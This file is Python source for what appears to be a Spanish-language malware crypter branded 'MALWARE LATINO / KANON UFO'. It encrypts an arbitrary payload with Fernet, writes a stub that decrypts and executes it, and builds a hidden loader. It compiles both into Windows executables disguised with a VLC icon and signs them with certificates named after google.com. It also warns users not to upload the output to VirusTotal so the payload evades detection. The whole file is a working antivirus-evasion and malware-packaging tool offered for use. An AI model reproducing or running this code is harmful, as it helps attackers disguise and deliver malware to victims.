#!/usr/local/bin/python
# coding: latin-1
#ufo : KANON 

from cryptography.fernet import Fernet
import os
import sys
import random
import time
import subprocess
import platform
import os.path
from os import path

os.system('clear')

class bcolors:
  BLUE = '\033[94m'
  GREEN = '\033[92m'
  WARNING = '\033[93m'
  WHITE = '\033[97m'
  ERROR = '\033[91m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'

#if sys.argv[0]:
  # print bcolors.BOLD + bcolors.WHITE + "[+] especificar un archivo de carga útil de entrada para ofuscar"
  # print bcolors.BOLD + bcolors.WHITE + "[+] Syntax : python UFO-OFUSCADOR.py payload.txt "
 #  sys.exit(0)
#else:
with open(sys.argv[1], 'r+') as f:
   contents = f.read()
   banner = '''
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<UFO ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$ hacker`"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
    '''
print banner.decode('utf-8')

print bcolors.BOLD + bcolors.WHITE + "                                              [+] MALWARE LATINO"
print bcolors.BOLD + bcolors.WHITE + "                                              [+] KANON UFO "
print bcolors.BOLD + bcolors.WHITE + "                                              [+] YOUTUBE CHANNEL : https://www.youtube.com/c/KanonBlack/videos?view_as=subscriber"
print bcolors.BOLD + bcolors.WHITE + "                                              [+] GRUPO DE TELEGRAM :           "
print bcolors.BOLD + bcolors.WHITE + "                                              [+] GITHUB : https://github.com/kanonufo"
print bcolors.BOLD + bcolors.WHITE + "                                              "
 
time.sleep(3)

print bcolors.BLUE + "[+] Raw payload"
print " ============================================================================================="
print contents
print " ============================================================================================="

print bcolors.ERROR + bcolors.BOLD + "[+] Generando Fernet MultiKey"
key = Fernet.generate_key()
print bcolors.BOLD + bcolors.WHITE + "[+] Key = " + key
print bcolors.WHITE + "[+] Tome nota de la clave para descifrar"

print  bcolors.BOLD + "[+] Generando Objeto Fernet ... por favor espere"
f = Fernet(key)
print  bcolors.BOLD + bcolors.WHITE + "[+] Objeto generado en Fernet :"  
print  f
print bcolors.ERROR + bcolors.BOLD + "[+] Encriptando Payload"
time.sleep(2)
print bcolors.BOLD + bcolors.WHITE +  "================================================================================="
enc_payload = f.encrypt(contents)
print bcolors.BOLD + bcolors.WHITE + "[+] Encriptando Payload : " + enc_payload
print bcolors.BOLD + bcolors.WHITE +  "================================================================================="

print bcolors.ERROR + bcolors.BOLD + "[+] Escribiendo la carga útil RAW en el archivo, espere"
#filename1 = "payload" 
Filename = "RawPayload%i"%random.randint(1,10000000001)+".txt"
#print Filename # bookmark 

f1 = open("RawPayload%i"%random.randint(1,10000000001)+".txt", "a")
f1.write(enc_payload)
f1.close()

print  bcolors.BOLD + bcolors.WHITE + "[+] Carga útil cifrada sin formato escrita en:" + f1.name

print bcolors.BLUE + bcolors.BOLD + "[+] ¿Desea continuar para generar la carga útilen en ejecutable? (Y/N)"
decision = str(raw_input("enter Y or N\n"))
if decision == 'N':
   print bcolors.BOLD + bcolors.WHITE + "[+]  Que tengas un buen día!!"
   print bcolors.BOLD + bcolors.WHITE + "[+]  NO SUBIR A VIRUSTOTAL !!!"
   sys.exit(0)
elif decision == 'Y':
    
    # Create final Obfuscated Executable Python  payload 
    print bcolors.BOLD + bcolors.WHITE + "[+] Generando la carga útil final de Python ofuscado, espere"
    time.sleep(2)
    final_payload = open("FinalPayload%i"%random.randint(1,10000000001)+".py", "w")
    #final_payload = open("FinalPayload.py", "w")
    final_payload.write("""
from cryptography.fernet import Fernet
import os
import sys

key = """ + "\'"+key+"\'")
    #final_payload = open("FinalPayload%i"%random.randint(1,10000000001)+".py", "a")
final_payload.write("""
f_obj= Fernet(key)
enc_pay =""" "\'"+enc_payload+"\'")
    #final_payload = open("FinalPayload%i"%random.randint(1,10000000001)+".py", "a")
final_payload.write("""
exec(f_obj.decrypt(enc_pay))
    """)
final_payload.close()

#Creating Silent Loader 
load = open("loader.py","w")
load.write("""
import win32gui, win32con
import os
import subprocess
#subprocess.Popen(['out1signed.exe'])
subprocess.call("out1signed.exe", shell=True)
    """)
load.close()

print  bcolors.BOLD + bcolors.WHITE + "[+] Final Encrypted Payload Escrito A %s : " + final_payload.name #"FinalPayload%i"%random.randint(1,10000000001)+".py"

time.sleep(3)

print  bcolors.BOLD + bcolors.BLUE + "[+] ¿Desea compilar una carga útil ejecutable (.exe)? (Y/N) :"
decision1 = str(raw_input("Enter Y or N\n"))
if decision1 == 'N':
   print bcolors.BOLD + bcolors.WHITE + "                [+]  Que tengas un buen día !!"
   print bcolors.BOLD + bcolors.WHITE + "                [+]  NO SUBIRLA A VIRUSTOTAL !!!"
   sys.exit(0)
elif decision1 == 'Y':
    
    # Create  EXE 
    print bcolors.BOLD + bcolors.WHITE + "                [+] VERIFICANDO DEPENDENCIAS "
    dep_apt = path.exists('/usr/bin/apt')
    dep_arch = platform.architecture()[0]
    dep_wine = path.exists('/usr/bin/wine')
    dep_wine64 = path.exists('/usr/bin/wine64')
    dep_win_python = path.exists('/root/.wine/drive_c/Python27/python.exe')
    dep_win_pyinstaller = path.exists('/root/.wine/drive_c/Python27/Scripts/pyinstaller.exe')
    dep_win_pywin32 = path.exists('/root/.wine/drive_c/Python27/Scripts/pywin32_postinstall.py')
    dep_win_crypt = path.exists('/root/.wine/drive_c/Python27/Lib/site-packages/cryptography')
    dep_win_Fernet = path.exists('/root/.wine/drive_c/Python27/Lib/site-packages/cryptography/fernet.pyc')
    print bcolors.BOLD + bcolors.WHITE + "                [+] OS Architecture : " + dep_arch
    if dep_wine == True and (dep_arch == '32bit' or dep_arch =='64bits'):
      print bcolors.BOLD + bcolors.WHITE + "              [+] Wine Installed "
    else:
        print bcolors.BOLD + bcolors.WHITE + "            [+] Updating Wine and osslsigncode for x86 Arch"
        os.system('apt-get install wine -y')
        os.system('apt-get install osslsigncode -y')
    if dep_wine64  == True and dep_arch == '64bit':
      print bcolors.BOLD + bcolors.WHITE + "              [+] Wine64 Instalado "
    else:
        print bcolors.BOLD + bcolors.WHITE + "            [+] Instalando Wine64 para x64 Arch"
        os.system('apt-get install wine64 -y')
    if dep_win_python == True:
      print bcolors.BOLD + bcolors.WHITE + "              [+] Python para Windows Subsystem Instalado"
    else:
        print bcolors.BOLD + bcolors.WHITE + "            [+] Instalando Python para Windows Subsystem"
        os.system('wine msiexec /i python-2.7.16.msi')
    if dep_win_pyinstaller == True: 
      print bcolors.BOLD + bcolors.WHITE + "              [+] Pyinstaller para Windows Instalado"
    else:
        print bcolors.BOLD + bcolors.WHITE + "            [+] Instalando Pyinstaller para Windows"
        os.system('wine /root/.wine/drive_c/Python27/python.exe -m pip install pyinstaller')
    if dep_win_pywin32 == True:
      print bcolors.BOLD + bcolors.WHITE + "              [+] Pywin32  Already Instalado"
    else:
        print bcolors.BOLD + bcolors.WHITE + "            [+] Instalando Pywin32 "
        os.system('wine /root/.wine/drive_c/Python27/python.exe -m pip install pywin32-225-cp27-cp27m-win32.whl')
        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pywin32_postinstall.py -install')
    if dep_win_crypt == True:
      print bcolors.BOLD + bcolors.WHITE + "              [+] Windows Python Cryptography Library Presente"
    else:
        print bcolors.BOLD + bcolors.WHITE + "            [+] Instalando Cryptography"
        os.system('wine /root/.wine/drive_c/Python27/python.exe -m pip install cryptography')
    if dep_win_Fernet == True:
      print bcolors.BOLD + bcolors.WHITE + "              [+] Windows Python Fernet Library Presente"
    else:
        print bcolors.BOLD + bcolors.WHITE + "            [+] Instalando Fernet"
        os.system('wine /root/.wine/drive_c/Python27/python.exe -m pip install Fernet')
        print bcolors.BOLD + bcolors.WHITE + "            [+] Dependency Check Complete , Initiating Compilation, Please Wait"


print bcolors.BOLD + bcolors.BLUE + "             [+] Ingrese el nombre de archivo de la carga útil final generada (Ex:FinalPayload54321.py :"

file_name = str(raw_input("enter Filename :"))
#print file_name.name
fileobj = open(file_name,"r")
print fileobj.name

with open("out1.py","w") as p1:
     for line in fileobj:
         p1.write(line)
#p1.close()
os.system('wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe -F --icon=vlc.ico --hidden-import "cryptography.*" --hidden-import Fernet --hidden-import os --hidden-import sys --hidden-import time --hidden-import cryptography --hidden-import code  --hidden-import shutil --runtime-hook script.py out1.py')
#CREATE_NO_WINDOW = 0x08000000
#subprocess.call('wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe -F --noconsole --hidden-import "cryptography.*" --hidden-import Fernet --hidden-import os --hidden-import sys --hidden-import time --hidden-import cryptography --hidden-import code --hidden-import shutil --runtime-hook script.py out1.py', shell=False)												
print bcolors.BOLD + bcolors.WHITE + "[+] Compilación Payload Exitosa............"

print bcolors.BOLD + bcolors.WHITE + "[+] Compilando Loader , Por favor espere................."
time.sleep(1)
os.system('wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe -F --icon=vlc.ico --noconsole --hidden-import os --hidden-import sys --hidden-import time --hidden-import cryptography --hidden-import code --hidden-import shutil --hidden-import win32con --hidden-import win32gui --runtime-hook Loader_script.py loader.py')

print bcolors.BOLD + bcolors.WHITE + "[+] Realizando trabajo de limpieza, espere"

os.system('rm out1.py out1.spec loader.spec loader.py')
time.sleep(1) 

print bcolors.BOLD + bcolors.ERROR + "[+] Firma de aplicaciones con certificado SHA256 ... Espere"
time.sleep(1)
os.system('osslsigncode sign -certs www.google.com.crt -key www.google.com.key -t http://timestamp.globalsign.com/scripts/timestamp.dll -in ./dist/out1.exe -out ./dist/out1signed.exe')
os.system('osslsigncode sign -certs www.google.com.crt -key www.google.com.key -t http://timestamp.globalsign.com/scripts/timestamp.dll -in ./dist/loader.exe -out ./dist/loadersigned.exe')

print bcolors.BOLD + bcolors.ERROR + "[+] Ejecutables firmados con éxito"

print bcolors.BOLD + bcolors.WHITE + "[+] Ejecutable y cargador ubicado en la subcarpeta / dist"
print bcolors.BOLD + bcolors.ERROR + "[+] Utilice out1signed.exe y loadersigned.exe en la subcarpeta / dist"

#print bcolors.BOLD + bcolors.WHITE + "[+] Was the raw Payload provided, a MSF payload ? (Y/N)"


print bcolors.BLUE + bcolors.BOLD + "[+]  "

decr = 5
while True:
         print bcolors.ERROR + bcolors.BOLD + "[+] NO SUBIR A VIRUSTOTAL"
         decr = decr-1
         if(decr <=0):
           break
           sys.exit(0)
else: 
     sys.exit(0)
     print bcolors.ERROR + bcolors.BOLD + "[+] Responda  Y o N SOLAMENTE" 
     sys.exit(0)
